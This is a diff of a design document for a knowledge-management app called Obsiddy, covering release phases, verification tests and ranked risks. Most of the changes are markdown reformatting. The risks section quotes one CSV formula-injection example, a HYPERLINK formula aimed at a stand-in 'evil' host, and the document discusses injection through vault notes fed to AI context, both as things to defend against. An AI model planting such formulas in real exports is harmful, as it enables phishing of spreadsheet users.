-**Partial failure:** phases `plan → snapshot → pull-apply → push-stage → commit`. Per-file failures are collected, not thrown. A phase failure calls `abort()` and leaves `ObsiddyVaultFile` untouched so the next run recomputes from the same base. **The invariant:** `syncedHash` advances for a file only after *both* the DB write and the transport write succeeded.
+**Partial failure:** phases `plan → snapshot → pull-apply → push-stage → commit`. Per-file failures are collected, not thrown. A phase failure calls `abort()` and leaves `ObsiddyVaultFile` untouched so the next run recomputes from the same base. **The invariant:** `syncedHash` advances for a file only after _both_ the DB write and the transport write succeeded.
 
 ### Safety
 
@@ -950,6 +954,7 @@ Manual `POST /obsiddy/vaults/:id/sync` runs inline with a 25s budget, falls back
 **Markdown injection.** A vault is a folder synced from the internet; its content is not fully trusted even though it's nominally the user's. Wrap note bodies in a delimited, labelled untrusted-content block (the `LOCKED CONTEXT` convention is the precedent); never let a body reach system-prompt position; **do not resolve `![[embeds]]` server-side** (unbounded expansion plus a tidy exfil primitive); cap notes and tokens per turn.
 
 **Blast radius — all three required:**
+
 - **Dry-run is the default for a vault's first sync and always available.** Persists the full plan to `ObsiddyVaultSyncRun.plan`, returns a per-file diff, writes nothing. Apply takes the `runId` and refuses if hashes moved. Cheap, because the session is already staged.
 - **Pre-sync snapshot** before the first write of every apply run, 30-day retention. For git it's free (record the sha); **for Drive it is the only recovery path, so mandatory there.**
 - **Mass-deletion circuit breaker** — refuse without explicit `confirmDestructive: true` if the plan deletes or blanks >10% of files or >50 files. The classic failure is pointing the vault at an empty folder and dutifully deleting the user's whole brain.
@@ -964,9 +969,9 @@ Sync writes entities through the same `lib/framework/obsiddy/repo/*` functions a
 
 ### Vault × sharing
 
-**Shared-in items do NOT sync into the grantee's vault.** Once someone else's note is a file in your vault you *will* edit it, and now we owe a write-back path across an ownership boundary under a viewer grant — an entire second permission model inside the sync engine. Revocation also becomes unenforceable, and deleting files out of someone's personal Dropbox on a third party's action is appalling behaviour even if we could.
+**Shared-in items do NOT sync into the grantee's vault.** Once someone else's note is a file in your vault you _will_ edit it, and now we owe a write-back path across an ownership boundary under a viewer grant — an entire second permission model inside the sync engine. Revocation also becomes unenforceable, and deleting files out of someone's personal Dropbox on a third party's action is appalling behaviour even if we could.
 
-Instead: the owner's own file gets generated `shared: true` / `granted-to: 2` frontmatter (one of the few fields where vault edits do *not* win), so the owner can see their sharing posture from Obsidian. `/shared-with-me` offers a manual markdown download.
+Instead: the owner's own file gets generated `shared: true` / `granted-to: 2` frontmatter (one of the few fields where vault edits do _not_ win), so the owner can see their sharing posture from Obsidian. `/shared-with-me` offers a manual markdown download.
 
 Two more: **a public link must render the DB row, not the vault file** (a mid-flight sync must not change what a public page shows), and **publicly-shared items are exempt from `deletePropagation:'mirror'`** — a stray vault deletion silently 404-ing a link given to 200 people is a bad day.
 
@@ -980,21 +985,21 @@ Four releases. **Release 1 is a complete no-Obsidian build** and is the only one
 
 Everything you asked for except vault sync and sharing. Usable daily on its own.
 
-| # | Deliverable | Verifiable by |
-| --- | --- | --- |
-| 0 | **Framework-tier scaffold**: `lib/framework/obsiddy/`, `prisma/schema/framework-obsiddy.prisma`, `.context/framework/obsiddy/` + **`install.md`**, tier `eslint.config.mjs`, dynamic boot `lib/app/bootstrap.ts` → `leaf-bootstrap.ts`, `obsiddyEnvSchema`, `/obsiddy` in `protected-routes.ts`, CHANGELOG bullet | `validate`; **the app still builds with `lib/framework/` deleted** — proves the dynamic import |
-| 0b | **Upstream the two missing seams**: `lib/app/maintenance-tasks.ts` (`registerAppMaintenanceTask`) and `lib/app/protected-nav.ts` | Obsiddy touches zero Sunrise-owned files |
-| 1 | Schema + hand-edited migration + 6 drift probes + `ensureObsiddySpace()` | `db:drift-check` green |
-| 2 | `lib/framework/obsiddy/repo/*` with **`OwnerScope`** + services + validations + CRUD routes (incl. entities) | route tests incl. cross-user isolation |
-| 3 | Priority engine (`manualBoost` + snooze presets + `snoozeCount`) + `/obsiddy/today` + `/obsiddy/inbox` + ETags | ~40-case table test on the pure scorer |
-| 4 | Indexer, `searchObsiddy`, `findConnections` (incl. thought-to-thought), **document ingestion reusing the platform parsers**, `/search`, `/reindex`, `/documents` | `scripts/smoke/obsiddy-search.ts`; upload a PDF and find it by meaning |
-| 5 | UI: layout, Today, Inbox, Projects, Goals, **Entities**, **Documents**, Connections, **Graph** (new dep `d3-force`), forms, quick capture, pin/snooze controls | manual + component tests |
-| 5b | **Boards** (§12): tags, checklists, board CRUD, `/view` endpoint, kanban UI (new deps `@dnd-kit/core` + `@dnd-kit/sortable`), WIP limits, swimlanes, CSV + JSON export | drag across columns changes `status`; keyboard-only reorder works; CSV imports into a real Trello board |
-| 6 | 14 capabilities (incl. `obsiddy_upsert_entity`, `obsiddy_ideate`, `obsiddy_get_briefing`) + **`obsiddy-core` agent profile** + 5 agents incl. **`obsiddy-judge`** + explicit guard modes + `output.sources` provenance + seeds 021+ + context contributor + app chat route + chat page | a conversation exercising each tool; a claim traces back to its source note |
-| 7 | 6 workflows incl. **`obsiddy-morning-briefing`** (`report` + `route` on `workStyle`) + `obsiddy-briefer` agent + `workStyle` setting + briefing button on Today + `ensureObsiddySchedules()` + notification emails | force-tick with cron `* * * * *`; the button returns a stored briefing with no LLM call |
-| 7b | **Platform wiring (§7):** `McpExposedTool` seed rows + a scoped `McpApiKey` → brain usable from Claude Code; `lib/app/admin-nav.ts` section; iOS Shortcut capture; eval dataset + `obsiddy-triage-accuracy` grader | query the brain from Claude Code; run the eval before and after a prompt edit |
-| 8 | **Lifecycle:** `archivedAt` + repo base filter + `enforceObsiddyRetention()` + restore routes + archived views + stale digest | clock-shifted retention test; archived items absent from vector search, present in keyword search |
-| 9 | PWA manifest/icons/share-target + **voice capture** (`useVoiceRecording` + `transcribe`) + **image capture** + `AiApiKey` `obsiddy` scope for iOS Shortcuts + Postmark trigger + `obsiddy_capture_for_token` | `curl` inbound + Chrome installability + `npm run smoke:transcribe`; record a thought on a phone and find it by meaning |
+| #   | Deliverable                                                                                                                                                                                                                                                                                                       | Verifiable by                                                                                                           |
+| --- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
+| 0   | **Framework-tier scaffold**: `lib/framework/obsiddy/`, `prisma/schema/framework-obsiddy.prisma`, `.context/framework/obsiddy/` + **`install.md`**, tier `eslint.config.mjs`, dynamic boot `lib/app/bootstrap.ts` → `leaf-bootstrap.ts`, `obsiddyEnvSchema`, `/obsiddy` in `protected-routes.ts`, CHANGELOG bullet | `validate`; **the app still builds with `lib/framework/` deleted** — proves the dynamic import                          |
+| 0b  | **Upstream the two missing seams**: `lib/app/maintenance-tasks.ts` (`registerAppMaintenanceTask`) and `lib/app/protected-nav.ts`                                                                                                                                                                                  | Obsiddy touches zero Sunrise-owned files                                                                                |
+| 1   | Schema + hand-edited migration + 6 drift probes + `ensureObsiddySpace()`                                                                                                                                                                                                                                          | `db:drift-check` green                                                                                                  |
+| 2   | `lib/framework/obsiddy/repo/*` with **`OwnerScope`** + services + validations + CRUD routes (incl. entities)                                                                                                                                                                                                      | route tests incl. cross-user isolation                                                                                  |
+| 3   | Priority engine (`manualBoost` + snooze presets + `snoozeCount`) + `/obsiddy/today` + `/obsiddy/inbox` + ETags                                                                                                                                                                                                    | ~40-case table test on the pure scorer                                                                                  |
+| 4   | Indexer, `searchObsiddy`, `findConnections` (incl. thought-to-thought), **document ingestion reusing the platform parsers**, `/search`, `/reindex`, `/documents`                                                                                                                                                  | `scripts/framework/obsiddy/smoke-search.ts`; upload a PDF and find it by meaning                                        |
+| 5   | UI: layout, Today, Inbox, Projects, Goals, **Entities**, **Documents**, Connections, **Graph** (new dep `d3-force`), forms, quick capture, pin/snooze controls                                                                                                                                                    | manual + component tests                                                                                                |
+| 5b  | **Boards** (§12): tags, checklists, board CRUD, `/view` endpoint, kanban UI (new deps `@dnd-kit/core` + `@dnd-kit/sortable`), WIP limits, swimlanes, CSV + JSON export                                                                                                                                            | drag across columns changes `status`; keyboard-only reorder works; CSV imports into a real Trello board                 |
+| 6   | 14 capabilities (incl. `obsiddy_upsert_entity`, `obsiddy_ideate`, `obsiddy_get_briefing`) + **`obsiddy-core` agent profile** + 5 agents incl. **`obsiddy-judge`** + explicit guard modes + `output.sources` provenance + seeds 021+ + context contributor + app chat route + chat page                            | a conversation exercising each tool; a claim traces back to its source note                                             |
+| 7   | 6 workflows incl. **`obsiddy-morning-briefing`** (`report` + `route` on `workStyle`) + `obsiddy-briefer` agent + `workStyle` setting + briefing button on Today + `ensureObsiddySchedules()` + notification emails                                                                                                | force-tick with cron `* * * * *`; the button returns a stored briefing with no LLM call                                 |
+| 7b  | **Platform wiring (§7):** `McpExposedTool` seed rows + a scoped `McpApiKey` → brain usable from Claude Code; `lib/app/admin-nav.ts` section; iOS Shortcut capture; eval dataset + `obsiddy-triage-accuracy` grader                                                                                                | query the brain from Claude Code; run the eval before and after a prompt edit                                           |
+| 8   | **Lifecycle:** `archivedAt` + repo base filter + `enforceObsiddyRetention()` + restore routes + archived views + stale digest                                                                                                                                                                                     | clock-shifted retention test; archived items absent from vector search, present in keyword search                       |
+| 9   | PWA manifest/icons/share-target + **voice capture** (`useVoiceRecording` + `transcribe`) + **image capture** + `AiApiKey` `obsiddy` scope for iOS Shortcuts + Postmark trigger + `obsiddy_capture_for_token`                                                                                                      | `curl` inbound + Chrome installability + `npm run smoke:transcribe`; record a thought on a phone and find it by meaning |
 
 **Three new npm dependencies — `d3-force` (graph layout), `@dnd-kit/core` and `@dnd-kit/sortable` (board drag).** Document parsing reuses the platform's existing parsers and chunker; `@xyflow/react` is already a dependency. **No new crypto, no per-user credentials** — `lib/security/secret-box.ts` exists only to hold git/cloud tokens, so it does not appear in Release 1 at all.
 
@@ -1004,13 +1009,13 @@ Everything you asked for except vault sync and sharing. Usable daily on its own.
 
 ### Release 2 — sharing
 
-| # | Deliverable | Verifiable by |
-| --- | --- | --- |
-| 10 | Access resolution + `obsiddyVisibilityScope` + owner short-circuit + eslint boundary | isolation tests 1–4 |
-| 11 | Public share links: token minting, `/s/[token]` reader, robots + `X-Robots-Tag` + `Referrer-Policy`, revocation, expiry | tests 14–18 |
-| 12 | Named grants + cascade + redaction + `/shared-with-me` | tests 5–9 |
-| 13 | Invite flow + `emails/obsiddy-share-invite.tsx` + rate limit; then comments + commenter role | tests 10–13 |
-| 14 | Erasure hook + drift probes + grantee-email scrub | tests 22–24 |
+| #   | Deliverable                                                                                                             | Verifiable by       |
+| --- | ----------------------------------------------------------------------------------------------------------------------- | ------------------- |
+| 10  | Access resolution + `obsiddyVisibilityScope` + owner short-circuit + eslint boundary                                    | isolation tests 1–4 |
+| 11  | Public share links: token minting, `/s/[token]` reader, robots + `X-Robots-Tag` + `Referrer-Policy`, revocation, expiry | tests 14–18         |
+| 12  | Named grants + cascade + redaction + `/shared-with-me`                                                                  | tests 5–9           |
+| 13  | Invite flow + `emails/obsiddy-share-invite.tsx` + rate limit; then comments + commenter role                            | tests 10–13         |
+| 14  | Erasure hook + drift probes + grantee-email scrub                                                                       | tests 22–24         |
 
 Cheap — 4–5 days — because `conversation-access.ts`, `invitation-token.ts`, `emails/invitation.tsx`, `visitor-id.ts` and `registerErasureCleanupHook` are all correct existing precedents. The expensive part is the test matrix, and it should be.
 
@@ -1020,25 +1025,25 @@ Note `visibility` and the `OwnerScope` repo boundary land in Release 1 phases 1�
 
 The Obsidian on-ramp, without owning a live sync engine.
 
-| # | Deliverable | Verifiable by |
-| --- | --- | --- |
-| 15 | **Markdown codec, pure** (new dep `yaml`) | round-trip property tests |
-| 16 | Vault schema + reconciler + merge, **pure** | full conflict matrix as a table test |
-| 17 | Transport interface + **Zip + Managed + `generateStarterVault`** (new dep `fflate`) + runner + dry-run + snapshot + tick sweep | import a real vault; export; re-import is a no-op |
+| #   | Deliverable                                                                                                                    | Verifiable by                                     |
+| --- | ------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------- |
+| 15  | **Markdown codec, pure** (new dep `yaml`)                                                                                      | round-trip property tests                         |
+| 16  | Vault schema + reconciler + merge, **pure**                                                                                    | full conflict matrix as a table test              |
+| 17  | Transport interface + **Zip + Managed + `generateStarterVault`** (new dep `fflate`) + runner + dry-run + snapshot + tick sweep | import a real vault; export; re-import is a no-op |
 
-**Phase 15 is independently shippable and worth doing even if Release 3 stops there.** It's 2–3 days, pure, and gives you "download my entire brain as a folder of markdown" — the honest answer to *"what happens to my data if I stop using this?"*, which for a product other people use will get asked. Someone can drop that export into Obsidian themselves without you owning any sync.
+**Phase 15 is independently shippable and worth doing even if Release 3 stops there.** It's 2–3 days, pure, and gives you "download my entire brain as a folder of markdown" — the honest answer to _"what happens to my data if I stop using this?"_, which for a product other people use will get asked. Someone can drop that export into Obsidian themselves without you owning any sync.
 
 The full release is ~70% of what people mean by "Obsidian support" for ~15% of the cost of Release 4. No credentials, no OAuth, no live-folder conflict cases — because there is no live folder.
 
 ### Release 4 — live folder sync
 
-| # | Deliverable | Verifiable by |
-| --- | --- | --- |
-| 18 | `secret-box` — AES-256-GCM, optional env keys, fail-closed. **Own reviewed commit** | key-rotation + AAD-mismatch tests |
-| 19 | **Git transport** (new dep `isomorphic-git`) + remote guard + DNS re-check + host allowlist + PAT flow | manual against a real repo; SSRF suite |
+| #   | Deliverable                                                                                                 | Verifiable by                                                              |
+| --- | ----------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- |
+| 18  | `secret-box` — AES-256-GCM, optional env keys, fail-closed. **Own reviewed commit**                         | key-rotation + AAD-mismatch tests                                          |
+| 19  | **Git transport** (new dep `isomorphic-git`) + remote guard + DNS re-check + host allowlist + PAT flow      | manual against a real repo; SSRF suite                                     |
 | 19b | **Live Trello API push** (§12) — reuses the same `secret-box` credential store for the per-user key + token | a board creates lists, cards, labels and checklists in a real Trello board |
-| 20 | Git webhook, backoff, mass-deletion circuit breaker | forced-failure runs |
-| 21 | Dropbox. Google Drive only if demanded | |
+| 20  | Git webhook, backoff, mass-deletion circuit breaker                                                         | forced-failure runs                                                        |
+| 21  | Dropbox. Google Drive only if demanded                                                                      |                                                                            |
 
 Phase 19 is 5–7 days and is the first thing in the whole plan that can fail in production for reasons outside your code. Google Drive is ~8 days of code plus unbounded calendar risk from Google's consent-screen verification — the `drive` scope is restricted and triggers a CASA assessment.
 
@@ -1051,20 +1056,23 @@ Phase 19 is 5–7 days and is the first thing in the whole plan that can fail in
 ## 16. Verification
 
 1. `npm run validate` + `npm run test:coverage`. `npm run db:drift-check` after **every** subsequent `migrate dev` — non-negotiable.
-1b. **Scorer table test**, pure, no mocks. Beyond the six factors: `manualBoost: +1` outranks the highest-scoring unboosted task; `-1` sinks below the lowest; a boost past `manualBoostExpiresAt` scores **identically to `0`** *without* any background job having run; `deferUntil` in the future still wins over `manualBoost: +1`; `priorityFactors` reports `base` and `manualBoost` separately; boost values outside `[-1, +1]` are rejected by Zod, not silently clamped at the DB; `snoozeCount` has **no** effect on the score at any value.
-1c. **Lifecycle.** Snooze presets resolve in `ObsiddySpace.timezone`, not server time (assert with the space set to `Pacific/Auckland` while the process runs UTC); an unsnoozed item carries `returnedFromSnooze` on its first appearance only. Retention, clock-shifted: a 91-day-old inbox thought archives, an 89-day-old one doesn't; **a `rejected` `ObsiddyLink` survives every retention pass and the connection sweep still won't re-propose that pair**; `ObsiddyEvent` older than 400 days is pruned. Archive/restore: archiving deletes the item's `ObsiddyEmbedding` rows and it vanishes from `searchObsiddy` but is still found by `?includeArchived=true` keyword search; restoring nulls `indexedHash` and it returns to vector search after a backfill; an archived item with an active share link **still resolves at its public URL**.
-2. **Cross-user isolation, the most important suite.** Users A, B, anonymous. B `GET`s A's project → 404 not 403; B's lists and **search** never return A's rows *including when A's row is the better vector match*; B cannot create a row with `userId: A` via the body.
-3. **Grants:** cascade shows P's tasks but not their `notes` when `includeTaskDetail` is false; no `ObsiddyLink` from P to a non-shared item; revoke → 404 on the *next* request; a different signed-in user cannot accept an invite; the wrong-user path doesn't leak the target email unmasked.
+   1b. **Scorer table test**, pure, no mocks. Beyond the six factors: `manualBoost: +1` outranks the highest-scoring unboosted task; `-1` sinks below the lowest; a boost past `manualBoostExpiresAt` scores **identically to `0`** _without_ any background job having run; `deferUntil` in the future still wins over `manualBoost: +1`; `priorityFactors` reports `base` and `manualBoost` separately; boost values outside `[-1, +1]` are rejected by Zod, not silently clamped at the DB; `snoozeCount` has **no** effect on the score at any value.
+   1c. **Lifecycle.** Snooze presets resolve in `ObsiddySpace.timezone`, not server time (assert with the space set to `Pacific/Auckland` while the process runs UTC); an unsnoozed item carries `returnedFromSnooze` on its first appearance only. Retention, clock-shifted: a 91-day-old inbox thought archives, an 89-day-old one doesn't; **a `rejected` `ObsiddyLink` survives every retention pass and the connection sweep still won't re-propose that pair**; `ObsiddyEvent` older than 400 days is pruned. Archive/restore: archiving deletes the item's `ObsiddyEmbedding` rows and it vanishes from `searchObsiddy` but is still found by `?includeArchived=true` keyword search; restoring nulls `indexedHash` and it returns to vector search after a backfill; an archived item with an active share link **still resolves at its public URL**.
+2. **Cross-user isolation, the most important suite.** Users A, B, anonymous. B `GET`s A's project → 404 not 403; B's lists and **search** never return A's rows _including when A's row is the better vector match_; B cannot create a row with `userId: A` via the body.
+3. **Grants:** cascade shows P's tasks but not their `notes` when `includeTaskDetail` is false; no `ObsiddyLink` from P to a non-shared item; revoke → 404 on the _next_ request; a different signed-in user cannot accept an invite; the wrong-user path doesn't leak the target email unmasked.
 4. **Public links:** valid 200; tampered / revoked / expired all 404 with **identical response shape**; payload has no owner email, no other item IDs, no rationale, no priority score; `X-Robots-Tag` + meta robots + `/s/` in robots.txt; a public link grants **no** access to the authenticated route.
 5. **AI layer:** A's built context and embeddings contain zero `userId != A` rows, asserted by inspecting the built context **not by mocking**; A's `visibility='link'` item IS in A's own context; a grantee's comment text is absent from A's embeddings.
-6. **Erasure:** erase A → all `framework_obsiddy_*` rows gone, B's `/shared-with-me` empty, A's share link 404s, managed-vault blobs deleted. Erase B → A's item survives, the grant is gone, B's *unaccepted* invite on A's other item is gone, and `b@x.com` appears in **no** row anywhere. Mirror `scripts/smoke/erasure.ts`.
+6. **Erasure:** erase A → all `framework_obsiddy_*` rows gone, B's `/shared-with-me` empty, A's share link 404s, managed-vault blobs deleted. Erase B → A's item survives, the grant is gone, B's _unaccepted_ invite on A's other item is gone, and `b@x.com` appears in **no** row anywhere. Mirror `scripts/smoke/erasure.ts`.
 7. **Vault:** the full conflict matrix as a pure table test. **And the single most important sync test — a `obsiddy-id` in an uploaded vault file belonging to user B is treated as a new item for A, not a hijack of B's row.**
-8. New `scripts/smoke/obsiddy.ts` modelled on `scripts/smoke/knowledge-hybrid-search.ts`: bootstrap → capture 20 thoughts → reindex → hybrid search → connection sweep → reprioritise → assert the expected task ranks first.
-8f. **Morning briefing.** `GET /obsiddy/briefing` returns the stored briefing with **zero LLM calls** — assert no provider call is made on the happy path. A briefing older than 18 hours triggers regeneration; a fresh one doesn't. `workStyle: 'structured'` and `'exploratory'` produce **materially different selected items**, not just different wording — assert the exploratory briefing contains an unreviewed `ObsiddyLink` the structured one omits, and vice versa for overdue tasks. The "surprise me today" override changes one briefing and leaves `ObsiddySpace.workStyle` unchanged. "Recently achieved" reflects `ObsiddyEvent{kind:'completed'}` in the last 7 days and never includes another user's completions.
-8e. **Capture channels and export hardening.** Record 10 seconds of speech, assert a `ObsiddyThought` lands with `source: 'voice'` and the transcript populated, and that **no audio file is retained**. Photograph text, assert extraction. An `AiApiKey` scoped to `obsiddy` can POST `/obsiddy/capture` and **cannot** reach `/obsiddy/tasks` or any admin route; a revoked key 401s immediately. **CSV export neutralises leading `=`, `+`, `-` and `@`** via `csvEscape` — the formula-injection case, tested explicitly.
-8d. **Platform wiring (§7).** From an MCP client authenticated with user A's key, `obsiddy_search` returns only A's rows and **never B's** — this is the same isolation invariant as the HTTP path but a completely separate entry point, so it needs its own test. An MCP key scoped to `obsiddy-companion` cannot dispatch a capability that agent isn't bound to. The `obsiddy-core` profile's guardrails appear in every agent's resolved prompt (`resolveEffectivePrompt`). A `judge_call` step resolves `obsiddy-judge` rather than failing on a missing agent. The eval dataset runs green against the seeded triage prompt, and a deliberately degraded prompt makes it fail — an eval that can't fail is measuring nothing. Obsiddy agents and workflows survive an export → wipe → import round trip via the existing backup exporter.
-8c. **Boards.** Dragging a card between columns changes `status` and nothing else; dragging to a column top sets `manualBoost` *with* an expiry. Explicit-board reorder survives a renormalisation pass with the same visual order. A `wipLimit` breach flags but does not block. **Sharing a filter-backed board then creating a matching task makes that task visible to the grantee** — assert it, because it's the leak the design deliberately accepts; then assert the snapshot path does *not* do this. A shared board exposes no `notes` when `includeTaskDetail` is off, and no `priorityScore` ever. CSV export opens in Trello's importer with lists and labels intact. **Export of a shared-in board is refused.** Keyboard-only: focus a card, move it across columns, save — no mouse.
-8b. **Entities and documents.** Upload one file per supported format (PDF, DOCX, EPUB, CSV, HTML, MD, TXT) and assert each reaches `status: 'ready'` with `chunkCount > 0`; assert a re-upload of the same bytes dedupes on `fileHash`; assert a document is findable by *meaning* rather than exact wording. Create two entities, link a project to both, and assert `GET /obsiddy/entities/[id]` returns only that entity's linked items — and that user B's entities never appear. Assert entities are **absent** from `score.ts` inputs (a neglected client must not inflate task scores). Assert `/obsiddy/graph?focus=…&depth=1` respects the node cap and excludes archived items.
+8. New `scripts/framework/obsiddy/smoke-end-to-end.ts` (fork-owned path and a
+   `framework:obsiddy:*` script name — `scripts/smoke/` and the unprefixed
+   `smoke:*` names are Sunrise's, per `CUSTOMIZATION.md` §7 and ask #12) modelled
+   on `scripts/smoke/knowledge-hybrid-search.ts`: bootstrap → capture 20 thoughts → reindex → hybrid search → connection sweep → reprioritise → assert the expected task ranks first.
+   8f. **Morning briefing.** `GET /obsiddy/briefing` returns the stored briefing with **zero LLM calls** — assert no provider call is made on the happy path. A briefing older than 18 hours triggers regeneration; a fresh one doesn't. `workStyle: 'structured'` and `'exploratory'` produce **materially different selected items**, not just different wording — assert the exploratory briefing contains an unreviewed `ObsiddyLink` the structured one omits, and vice versa for overdue tasks. The "surprise me today" override changes one briefing and leaves `ObsiddySpace.workStyle` unchanged. "Recently achieved" reflects `ObsiddyEvent{kind:'completed'}` in the last 7 days and never includes another user's completions.
+   8e. **Capture channels and export hardening.** Record 10 seconds of speech, assert a `ObsiddyThought` lands with `source: 'voice'` and the transcript populated, and that **no audio file is retained**. Photograph text, assert extraction. An `AiApiKey` scoped to `obsiddy` can POST `/obsiddy/capture` and **cannot** reach `/obsiddy/tasks` or any admin route; a revoked key 401s immediately. **CSV export neutralises leading `=`, `+`, `-` and `@`** via `csvEscape` — the formula-injection case, tested explicitly.
+   8d. **Platform wiring (§7).** From an MCP client authenticated with user A's key, `obsiddy_search` returns only A's rows and **never B's** — this is the same isolation invariant as the HTTP path but a completely separate entry point, so it needs its own test. An MCP key scoped to `obsiddy-companion` cannot dispatch a capability that agent isn't bound to. The `obsiddy-core` profile's guardrails appear in every agent's resolved prompt (`resolveEffectivePrompt`). A `judge_call` step resolves `obsiddy-judge` rather than failing on a missing agent. The eval dataset runs green against the seeded triage prompt, and a deliberately degraded prompt makes it fail — an eval that can't fail is measuring nothing. Obsiddy agents and workflows survive an export → wipe → import round trip via the existing backup exporter.
+   8c. **Boards.** Dragging a card between columns changes `status` and nothing else; dragging to a column top sets `manualBoost` _with_ an expiry. Explicit-board reorder survives a renormalisation pass with the same visual order. A `wipLimit` breach flags but does not block. **Sharing a filter-backed board then creating a matching task makes that task visible to the grantee** — assert it, because it's the leak the design deliberately accepts; then assert the snapshot path does _not_ do this. A shared board exposes no `notes` when `includeTaskDetail` is off, and no `priorityScore` ever. CSV export opens in Trello's importer with lists and labels intact. **Export of a shared-in board is refused.** Keyboard-only: focus a card, move it across columns, save — no mouse.
+   8b. **Entities and documents.** Upload one file per supported format (PDF, DOCX, EPUB, CSV, HTML, MD, TXT) and assert each reaches `status: 'ready'` with `chunkCount > 0`; assert a re-upload of the same bytes dedupes on `fileHash`; assert a document is findable by _meaning_ rather than exact wording. Create two entities, link a project to both, and assert `GET /obsiddy/entities/[id]` returns only that entity's linked items — and that user B's entities never appear. Assert entities are **absent** from `score.ts` inputs (a neglected client must not inflate task scores). Assert `/obsiddy/graph?focus=…&depth=1` respects the node cap and excludes archived items.
 9. Inbound: `curl -u $POSTMARK_INBOUND_USER:$POSTMARK_INBOUND_PASS` a Postmark-shaped body; assert a thought lands and a replay of the same `MessageID` dedupes.
 10. Schedules: set a cron to `* * * * *`, let the dev ticker fire, assert `AiWorkflowExecution.userId` equals the schedule creator and a `ObsiddyReview` appears.
 11. PWA: DevTools → Application → Manifest → Installability; Android share sheet → `/obsiddy/capture` prefilled.
@@ -1073,26 +1081,26 @@ Phase 19 is 5–7 days and is the first thing in the whole plan that can fail in
 
 ## 17. Risks, ranked by likelihood of biting
 
-1. **Prisma migration drift** — every `migrate dev` emits DROPs for 5 raw-SQL objects + the FK, and a dropped HNSW index degrades silently to seq-scan. *The six drift probes are the only thing standing between you and this.*
-2. **Spurious sync conflicts from formatting noise** — YAML key order, quote style, CRLF, Obsidian's own frontmatter rewriting. Fires day one and permanently destroys trust. *Normalise before hashing; separate body hash; treat "both changed, same result" as clean; dry-run showing the real diff.*
-3. **First-sync embedding cost blow-up** — 5000 notes re-embedded on every frontmatter tick. *No `updated:` in frontmatter, hash semantic content only, defer to the tick, per-user daily budget, `rev` counters.*
-4. **Mass-deletion blast** — wrong folder, empty clone, Drive permission blip. *`deletePropagation:'none'` default, 10%/50-file breaker, mandatory snapshot, tombstones.*
-5. **Embedding-dimension lock** — `vector(1536)` is baked into the column; swapping the active model breaks every brain query with a cast error. *Port `assertActiveModelMatchesStoredVectors()`.*
-5b. **Filtered HNSW search silently under-returning** — if archived items stayed in the vector index behind a `WHERE archivedAt IS NULL` filter, recall would degrade as history grows, with no error and no obvious symptom. *Archiving deletes the embedding rows outright (§11); the index only ever holds live data.*
-5c. **Pruning `rejected` links** — looks like dead data, is actually the tombstone stopping the weekly sweep re-proposing the same connection forever. *Comment it in the retention table; cover it with a test.*
+1. **Prisma migration drift** — every `migrate dev` emits DROPs for 5 raw-SQL objects + the FK, and a dropped HNSW index degrades silently to seq-scan. _The six drift probes are the only thing standing between you and this._
+2. **Spurious sync conflicts from formatting noise** — YAML key order, quote style, CRLF, Obsidian's own frontmatter rewriting. Fires day one and permanently destroys trust. _Normalise before hashing; separate body hash; treat "both changed, same result" as clean; dry-run showing the real diff._
+3. **First-sync embedding cost blow-up** — 5000 notes re-embedded on every frontmatter tick. _No `updated:` in frontmatter, hash semantic content only, defer to the tick, per-user daily budget, `rev` counters._
+4. **Mass-deletion blast** — wrong folder, empty clone, Drive permission blip. _`deletePropagation:'none'` default, 10%/50-file breaker, mandatory snapshot, tombstones._
+5. **Embedding-dimension lock** — `vector(1536)` is baked into the column; swapping the active model breaks every brain query with a cast error. _Port `assertActiveModelMatchesStoredVectors()`._
+   5b. **Filtered HNSW search silently under-returning** — if archived items stayed in the vector index behind a `WHERE archivedAt IS NULL` filter, recall would degrade as history grows, with no error and no obvious symptom. _Archiving deletes the embedding rows outright (§11); the index only ever holds live data._
+   5c. **Pruning `rejected` links** — looks like dead data, is actually the tombstone stopping the weekly sweep re-proposing the same connection forever. _Comment it in the retention table; cover it with a test._
 6. **Credential storage is genuinely new infrastructure** — no encryption exists, and the schema's own comments enshrine "the DB is admin-trusted", a norm that does not survive user-owned third-party tokens.
-6b. **Shared filter-backed boards silently widening.** A board shared as a live query keeps sharing tasks you create later. This is intended behaviour and still the most likely way someone leaks something through this product. *Plain-English filter disclosure in the share dialog, a live match count, and a one-click "share a snapshot instead" (§13).*
-6c. **Task-level access checks going per-row.** Tasks are now shareable and are the highest-cardinality table; a board view resolving access per card is both a performance cliff and the place an omission hides. *`resolveObsiddyAccessMany` only, asserted by a test that fails on N+1 access queries.*
-1b. **Portability rot.** The failure mode isn't dramatic — it's one core-file edit "just this once", one seed numbered against the host, one hard-coded `/obsiddy` prefix. Install #2 then costs a week of archaeology instead of a checklist. *Zero-core-file rule enforced at review; `install.md` kept current every phase; a CI check that the app builds with `lib/framework/` removed.*
-2b. **CSV formula injection on export.** A task titled `=HYPERLINK("http://evil","Q4 plan")` exported to CSV becomes a live formula the moment it opens in Excel or Sheets — and board export is a feature you'd hand to other people. *Every exported field goes through `csvEscape()` from `lib/api/csv.ts`; a test asserts a leading `=`, `+`, `-` or `@` is neutralised.* Cheap to fix, invisible until someone gets phished by their own board.
-6d. **MCP is a second front door to the same data.** Every isolation guarantee proven over HTTP has to hold over MCP too, and it's a path that's easy to forget when adding a capability. *`userId` comes from `auth.createdBy` (verified), never from a tool argument; `requireObsiddyUser` throws when it's absent; the isolation suite runs over both entry points.*
-7. **Access-check omission on the 41st new endpoint.** *Owner-vs-shared repo split + eslint boundary + separate `/shared/*` surface, so the default new endpoint is owner-scoped and safe.*
+   6b. **Shared filter-backed boards silently widening.** A board shared as a live query keeps sharing tasks you create later. This is intended behaviour and still the most likely way someone leaks something through this product. _Plain-English filter disclosure in the share dialog, a live match count, and a one-click "share a snapshot instead" (§13)._
+   6c. **Task-level access checks going per-row.** Tasks are now shareable and are the highest-cardinality table; a board view resolving access per card is both a performance cliff and the place an omission hides. _`resolveObsiddyAccessMany` only, asserted by a test that fails on N+1 access queries._
+   1b. **Portability rot.** The failure mode isn't dramatic — it's one core-file edit "just this once", one seed numbered against the host, one hard-coded `/obsiddy` prefix. Install #2 then costs a week of archaeology instead of a checklist. _Zero-core-file rule enforced at review; `install.md` kept current every phase; a CI check that the app builds with `lib/framework/` removed._
